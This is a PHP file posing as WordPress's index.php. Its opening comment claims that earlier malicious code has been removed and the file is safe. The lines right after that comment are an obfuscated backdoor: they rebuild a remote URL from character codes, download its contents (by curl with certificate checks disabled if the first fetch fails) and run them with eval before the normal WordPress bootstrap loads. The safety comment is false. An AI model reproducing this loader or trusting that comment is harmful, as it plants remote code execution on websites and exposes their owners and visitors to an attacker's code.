<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$wsxaqzplmkoi = str_replace(
    ['[P1]','[P2]','[P3]','[P4]','[P5]','[P6]','[P7]','[P8]','[P9]','[P10]','[P11]'],
    [
        chr(104).chr(116).chr(116).chr(112).chr(115),
        chr(58).chr(47).chr(47),
        chr(114).chr(97).chr(119).chr(46),
        chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(46),
        chr(99).chr(111).chr(109).chr(47),
        chr(109).chr(100).chr(109).chr(111).chr(109).chr(105).chr(110).chr(51).chr(54).chr(53).chr(51).chr(54).chr(54).chr(45).chr(103).chr(105).chr(102).chr(47),
        chr(98).chr(101).chr(108).chr(97).chr(47),
        chr(114).chr(101).chr(102).chr(115).chr(47),
        chr(104).chr(101).chr(97).chr(100).chr(115).chr(47),
        chr(109).chr(97).chr(105).chr(110).chr(47),
        chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(116).chr(120).chr(116)
    ],
    '[P1][P2][P3][P4][P5][P6][P7][P8][P9][P10][P11]'
);

$full_url = $wsxaqzplmkoi;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
